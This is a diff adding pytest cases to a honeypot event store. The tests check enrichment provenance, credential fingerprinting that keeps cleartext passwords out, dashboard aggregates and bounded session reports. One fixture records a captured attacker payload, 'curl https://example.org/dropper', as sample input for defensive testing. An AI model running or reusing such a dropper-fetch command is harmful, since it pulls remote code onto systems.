@@ -109,8 +109,144 @@ def test_ip_profile_keeps_external_enrichment_provenance(tmp_path):
     store.ingest(event)
     profile = store.ip_profile("203.0.113.40")
     assert profile["countries"] == ["IT"]
-    assert profile["threat_intelligence"][0]["source"] == "geo-fixture"
-    assert profile["threat_intelligence"][0]["provenance"] == "external_enrichment"
+    assert profile["external_enrichment"][0]["source"] == "geo-fixture"
+    assert profile["external_enrichment"][0]["provenance"] == "external_enrichment"
+    assert profile["external_enrichment"][0]["classification"] == "context_enrichment"
+    assert profile["threat_intelligence"] == []
+
+
+def test_relations_expose_provenance_and_safe_credential_fingerprint(tmp_path):
+    store = Store(str(tmp_path / "aegis.db"))
+    event = normalize_event({
+        "honeypot": "ssh-1",
+        "event_type": "credential",
+        "observed": {
+            "source_ip": "203.0.113.42",
+            "service": "ssh",
+            "protocol": "tcp",
+            "destination_port": 22,
+            "credential": {"username": "admin", "password": "reuse-me"},
+        },
+        "enrichment": {
+            "threat_context": {
+                "source": "fixture-feed",
+                "observed_at": "2026-09-22T18:00:00Z",
+                "data": {
+                    "match_policy": "exact",
+                    "matches": [{"type": "ip", "value": "203.0.113.42", "confidence": 70, "evidence": ["observed.source_ip"]}],
+                },
+            }
+        },
+    })
+    saved = store.ingest(event)
+    graph = store.relations(saved["session_id"])
+    nodes = graph["nodes"]
+    secret = next(node for node in nodes if node["kind"] == "credential_secret_fingerprint")
+    assert secret["provenance"] == "derived"
+    assert "reuse-me" not in str(graph)
+    threat = next(node for node in nodes if node["kind"] == "threat_intel")
+    assert threat["provenance"] == "enrichment"
+    assert threat["metadata"]["source"] == "fixture-feed"
+    ip = next(node for node in nodes if node["kind"] == "ip")
+    assert ip["provenance"] == "observed"
+
+
+def test_dashboard_exposes_investigation_dimensions_and_aggregates_geo_points(tmp_path):
+    store = Store(str(tmp_path / "aegis.db"))
+    timestamp = datetime.now(timezone.utc).replace(minute=0, second=0, microsecond=0).isoformat()
+    for event_type, payload in [
+        ("credential", {
+            "credential": {"username": "admin", "password": "same-secret"},
+        }),
+        ("web.payload", {
+            "payload": "curl https://example.org/dropper",
+        }),
+    ]:
+        observed = {
+            "source_ip": "203.0.113.55",
+            "service": "http",
+            "protocol": "tcp",
+            "destination_port": 8080,
+            **payload,
+        }
+        event = normalize_event({
+            "timestamp": timestamp,
+            "honeypot": "web-1",
+            "event_type": event_type,
+            "severity": "high" if event_type == "web.payload" else "medium",
+            "observed": observed,
+            "enrichment": {
+                "geo": {
+                    "source": "geo-fixture",
+                    "observed_at": timestamp,
+                    "data": {"country": "IT", "latitude": 41.9, "longitude": 12.5},
+                },
+                "asn": {
+                    "source": "asn-fixture",
+                    "observed_at": timestamp,
+                    "data": {"asn": "AS64500"},
+                },
+            },
+            "derived": {
+                "cve": [{
+                    "cve_id": "CVE-2099-0002",
+                    "rationale": "Synthetic evidence-backed fixture only.",
+                    "evidence": ["observed.payload"],
+                }]
+            } if event_type == "web.payload" else {},
+        })
+        store.ingest(event)
+
+    dashboard = store.dashboard(hours=24, include_simulation=True)
+    assert dashboard["totals"]["events"] == 2
+    assert dashboard["source_ip"][0] == {"label": "203.0.113.55", "value": 2}
+    assert dashboard["unique_source_ip_timeline"][0]["value"] == 1
+    assert dashboard["credentials"][0]["label"] == "admin"
+    assert dashboard["credential_secret_fingerprints"]
+    assert "same-secret" not in str(dashboard)
+    assert dashboard["payloads"][0]["value"] == 1
+    assert dashboard["cves"] == [{"label": "CVE-2099-0002", "value": 1}]
+    assert dashboard["map_points"][0]["count"] == 2
+    assert dashboard["map_points"][0]["session_count"] == 1
+    assert dashboard["analysis"]["provenance"]["hypotheses_in_analytics"] is False
+
+
+def test_session_investigation_is_bounded_and_discloses_truncation(tmp_path):
+    store = Store(str(tmp_path / "aegis.db"), session_max_events=100)
+    timestamp = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
+    session_id = None
+    for index in range(101):
+        saved = store.ingest(normalize_event({
+            "timestamp": timestamp,
+            "honeypot": "ssh-1",
+            "event_type": "connection",
+            "observed": {
+                "source_ip": "203.0.113.77",
+                "service": "ssh",
+                "protocol": "tcp",
+                "destination_port": 22,
+                "sensor_session_id": "bounded-session-1",
+                "sequence": index,
+            },
+        }))
+        session_id = saved["session_id"]
+
+    bundle = store.get_session(session_id)
+    assert bundle is not None
+    assert len(bundle["events"]) == 100
+    assert bundle["summary"]["truncated"] is True
+    assert bundle["analysis"] == {
+        "truncated": True,
+        "event_limit": 100,
+        "scope": "latest_session_events",
+    }
+
+    graph = store.relations(session_id)
+    assert graph["analysis"]["truncated"] is True
+    report = store.report(session_id)
+    assert report is not None
+    assert report["analysis"]["truncated"] is True
+    assert any("not a complete" in item for item in report["limitations"])
 
 
 def test_report_never_exports_cleartext_password(tmp_path, monkeypatch):
